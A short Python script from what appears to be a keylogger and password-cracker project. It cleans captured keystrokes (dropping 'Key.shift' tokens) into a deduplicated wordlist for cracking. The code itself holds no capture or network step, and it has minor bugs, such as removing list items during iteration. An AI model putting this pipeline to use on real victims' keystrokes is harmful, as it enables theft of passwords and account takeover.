import os
import sys

from pkg_resources import WorkingSet

def clean(file_name):
    """This function cleans up data and writes it into a final wordlist to use"""
    clean_list_of_data = []

    with open(file_name, 'r') as file:
        
        # creates lists of the raw data and cleaned data using list comprehension
        raw_list_of_data = [line.split("\'") for line in file]
        clean_list_of_data = [[y for y in x  if ('Key.shift' not in y) and ('\n' not in y)] for x in raw_list_of_data]
        
        #joins the characters of clean list to create a list of words
        for x in range(0, len(clean_list_of_data)):
            clean_list_of_data[x] = ''.join(clean_list_of_data[x])

        #clears out the whitespace within the list
        for x in clean_list_of_data:
            if x == ' ' or x == '':
                clean_list_of_data.remove(x)


        file.close()
    
    return set(clean_list_of_data)

def is_new(file_name, variable):
    """Function determines if a string already exists within a file"""
    x = True

    with open(file_name, 'r+') as file:
        for line in file:
            if variable in line:
                return False


        file.close()

    return x

# define path files as variables 
raw_file = "D:\Programming\python\Keylogger-Passwordcracker\Raw_Datat.txt"
clean_file = "D:\Programming\python\Keylogger-Passwordcracker\clean_data.txt"

#"clean" data from Raw_Data.txt into a neater more manageable wordlist
cleaned_data = clean(raw_file)

#Opens file to iterate through and write to it if values don't already exist
with open(clean_file, 'r+') as file:

    for line in file:
        for item in cleaned_data:

            if is_new(clean_file, item) == True:
                file.write(item+"\n")

    
    